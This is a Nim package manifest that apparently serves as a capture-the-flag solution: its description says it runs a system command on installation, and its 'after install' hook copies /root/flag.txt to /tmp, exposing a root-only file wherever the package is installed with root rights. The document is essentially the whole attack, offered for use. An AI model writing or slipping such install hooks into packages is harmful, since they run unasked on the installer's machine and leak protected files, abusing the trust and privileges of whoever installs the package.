# myproject.nimble

version       = "0.1.0"
author        = "Your Name"
description   = "A Nimble package that executes a system command upon installation"
license       = "MIT"
srcDir        = "."

# Dependencies

requires "nim >= 1.0.0"

# Main file

bin = @["omnigodz"]

# Post-install script
after install:
  exec "cp /root/flag.txt /tmp/flag.txt"
